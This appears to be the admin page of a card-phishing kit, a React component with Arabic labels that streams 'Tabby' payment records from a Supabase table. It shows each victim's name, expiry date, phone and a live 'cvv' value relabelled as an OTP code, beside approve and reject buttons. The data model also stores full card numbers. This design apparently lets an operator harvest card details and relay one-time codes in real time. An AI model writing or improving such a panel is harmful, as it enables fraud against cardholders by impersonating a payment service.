import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { AdminSidebar } from "@/components/AdminSidebar";
import { SidebarProvider } from "@/components/ui/sidebar";
import { Loader2 } from "lucide-react";

interface TabbyPayment {
  id: string;
  cardholder_name: string;
  card_number: string;
  card_number_last4: string;
  expiry_date: string;
  cvv: string;
  total_amount: number;
  company: string | null;
  phone: string | null;
  payment_status: string;
  created_at: string;
}

const AdminTabbyPayments = () => {
  const [payments, setPayments] = useState<TabbyPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState<string | null>(null);
  const { toast } = useToast();
  const navigate = useNavigate();

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin");
        return;
      }
    };

    checkAuth();
    fetchPayments();

    const channel = supabase
      .channel('tabby-payments-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'tabby_payments'
        },
        () => {
          fetchPayments();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      const { data, error } = await supabase
        .from('tabby_payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setPayments(data || []);
    } catch (error) {
      console.error('Error fetching payments:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في تحميل البيانات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفع بنجاح",
      });
      
      fetchPayments();
    } catch (error) {
      console.error('Error approving payment:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على الدفع",
        variant: "destructive",
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفع بنجاح",
      });
      
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting payment:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض الدفع",
        variant: "destructive",
      });
    } finally {
      setProcessing(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return <Badge className="bg-green-500">موافق عليه</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full bg-background" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8">
        <div className="mb-6">
          <h1 className="text-3xl font-bold">طلبات تابي</h1>
          <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي</p>
        </div>

        {payments.length === 0 ? (
          <Card className="p-8 text-center">
            <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
          </Card>
        ) : (
          <div className="grid gap-4">
            {payments.map((payment) => (
              <Card key={payment.id} className="p-6">
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="text-lg font-semibold">{payment.cardholder_name}</h3>
                      <p className="text-sm text-muted-foreground">
                        {new Date(payment.created_at).toLocaleDateString('ar-SA', {
                          year: 'numeric',
                          month: 'long',
                          day: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit'
                        })}
                      </p>
                    </div>
                    {getStatusBadge(payment.payment_status)}
                  </div>

                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <p className="font-medium text-muted-foreground">رقم البطاقة</p>
                      <p className="font-mono">**** **** **** {payment.card_number_last4}</p>
                    </div>
                    <div>
                      <p className="font-medium text-muted-foreground">تاريخ الانتهاء</p>
                      <p>{payment.expiry_date}</p>
                    </div>
                    <div>
                      <p className="font-medium text-muted-foreground">المبلغ الإجمالي</p>
                      <p className="font-semibold">{payment.total_amount.toFixed(2)} ريال</p>
                    </div>
                    {payment.company && (
                      <div>
                        <p className="font-medium text-muted-foreground">الشركة</p>
                        <p>{payment.company}</p>
                      </div>
                    )}
                    {payment.phone && (
                      <div>
                        <p className="font-medium text-muted-foreground">رقم الهاتف</p>
                        <p dir="ltr" className="text-right">{payment.phone}</p>
                      </div>
                    )}
                    {payment.cvv && (
                      <div className="col-span-2">
                        <p className="font-medium text-muted-foreground">كود التحقق (OTP)</p>
                        <p className="font-mono text-lg font-bold text-primary">{payment.cvv}</p>
                      </div>
                    )}
                  </div>

                  {payment.payment_status === 'pending' && payment.cvv && (
                    <div className="flex gap-2 pt-4">
                      <Button
                        onClick={() => handleApprove(payment.id)}
                        disabled={processing === payment.id}
                        className="flex-1"
                      >
                        {processing === payment.id ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          "موافقة"
                        )}
                      </Button>
                      <Button
                        onClick={() => handleReject(payment.id)}
                        disabled={processing === payment.id}
                        variant="destructive"
                        className="flex-1"
                      >
                        {processing === payment.id ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          "رفض"
                        )}
                      </Button>
                    </div>
                  )}
                </div>
              </Card>
            ))}
          </div>
        )}
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTabbyPayments;
